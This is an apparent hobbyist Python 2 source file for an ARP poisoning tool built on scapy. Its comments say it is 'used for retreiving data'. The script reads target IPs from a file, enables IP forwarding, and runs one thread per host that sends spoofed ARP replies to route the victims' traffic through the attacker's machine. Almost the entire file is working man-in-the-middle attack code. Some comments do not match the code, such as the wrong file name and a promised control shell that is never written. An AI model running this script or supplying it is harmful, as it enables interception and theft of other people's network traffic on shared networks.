#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Script made by papi
#
# Arp poisonning tool used for retreiving data
# provide it a file named host.txt for the hosts he has to arp
# provide it an argument with the gateway ip
# it will arp the entire network to your' machine
# use threading to arp individual clients
# and setup a shell so that when you send an id it stops certain arps
import sys
import threading

from scapy.all import *
from termcolor import colored

def usage():
    print "%s is a script that performs an arp poisonning attack" % sys.argv[0]
    print "for this script to work you need a file with different ip address's"
    print "that are on the network the file has to be named t_ip.txt by default"
    print "and located in the /tmp/ directory so: /tmp/t_ip.txt"
    print
    print "Usage:"
    print "\t%s [gateway_ip] [interface]    => performs and arp poisonning attack" % sys.argv[0]

#------ BHP code ------

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

def poison(gateway_ip, gateway_mac, target_ip, target_mac):
    while True:
        try:
            send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac))
            send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=target_mac))
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
            return

def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
    for s,r in responses:
        return r[Ether].src

#---------------------

class larp():
    '''-*- larp class -*-
        larp is software made by papi for arp poisonning
    '''

    def __init__(self, gateway_ip, interface, file_name, v=0):
        # setup all of the variables and the configurations
        print colored("[*] Starting up...", "green")
        conf.iface = interface
        conf.verb = v
        self.g_ip = gateway_ip
        self.interface = interface
        self.g_mac = get_mac(self.g_ip)
        self.t_ip = []
        self.t_mac = dict()         # map ip -> mac addr
        self.thread_array = []
        try:            # get all of the ip addr's
            with open(file_name, "r") as f:
                temp_ip = f.readlines()
                temp_ip = [ x.strip() for x in temp_ip ]
                f.close()
            with open("/proc/sys/net/ipv4/ip_forward", "r") as forward_file:
                data = forward_file.read()
                data = data.strip()
                forward_file.close()
            print colored("[^] ip_forward configuration: %s" % data, "blue")
            if "0" in data:
                print colored("[!] modifing /proc/sys/net/ipv4/ip_forward to 1"\
                , "red")
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write("1")
                    f.close()
            for ip in temp_ip:
                temp = get_mac(ip)
                if temp == None:
                    print colored("[!] Skipping %s, mac addr is None" % ip, "red")
                elif ip == gateway_ip:
                    print colored("[!] Skipping %s, it's the gateway" % ip, "red")
                else:
                    print colored("[^] %s => %s"% (ip, temp), "blue")
                    self.t_ip.append(ip)
                    self.t_mac[ip] = temp
        except:
            self.error("file provided does not exist and permission error")
        print colored("[*] Setup finished!", "green")

    def error(self, msg=""):
        print >> sys.stderr, colored(msg, 'red')
        sys.exit(-1)

    def main(self):
        t_id = 0    # thread id
        print colored("[*] Main Thread", "green")
        for ip in self.t_ip:
            self.thread_array.append(threading.Thread(target=poison, args=(self.g_ip, self.g_mac, ip, self.t_mac[ip])))
            self.thread_array[t_id].start()
            print colored("[^] ID: %d / Starting to ARP poison %s" % (t_id, ip), "blue")
            t_id += 1
        for thread in self.thread_array:
            thread.join()

if __name__ == "__main__":
    try:
        if len(sys.argv) == 3:
            script, gateway_ip, interface = sys.argv
        else:
            script, gateway_ip = sys.argv
            interface = "wlp2s0"
    except:
        print >> sys.stderr, colored("[!] YOU DID NOT PROVIDE THE GOOD NUMBER OF ARGUMENTS", 'red')
        usage()
        sys.exit(-1)

    ls = larp(gateway_ip, interface, "/tmp/t_ip.txt")
    ls.main()
